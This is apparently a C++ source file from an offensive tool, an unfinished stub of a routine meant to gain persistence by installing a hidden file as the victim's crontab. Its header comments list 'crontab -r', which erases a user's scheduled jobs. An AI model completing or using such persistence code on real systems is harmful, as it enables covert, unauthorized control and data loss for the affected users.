// crontab -r                                   --> this resets the crontab of the caller
// crontab cron_formatted_file.sh               --> this will install the file as the crontab of the caller

#include <iostream>
#include "run_command.h"
#include <cstdlib>
#include <string>

std::string get_current_user();

bool establish_crontab_persistence() {

    /*
     * check if the user has an existing crontab        ("no crontab" in the output of crontab -l)
     * create local hidden file
     * install it as a crontab
     * */

    std::cout << "[+] Entering the Crontab persistence routine" << '\n';

    int counter { 0 };                                              // the local flag to check if persistence was established

    std::string current_user = get_current_user();
    if (current_user == "FAILED_NO_USER") {return false;}               // no opportunity to edit a crontab if we don't have a user for some reason



    if (counter > 0) {return true;} else {return false;}        // make sure this line is correct before use --> should be > 0 if cron persistence was achieved
}

std::string get_current_user() {
    const char * current_user = std::getenv("USER");
    if (current_user) {return std::string(current_user);} else {return "FAILED_NO_USER";}
}
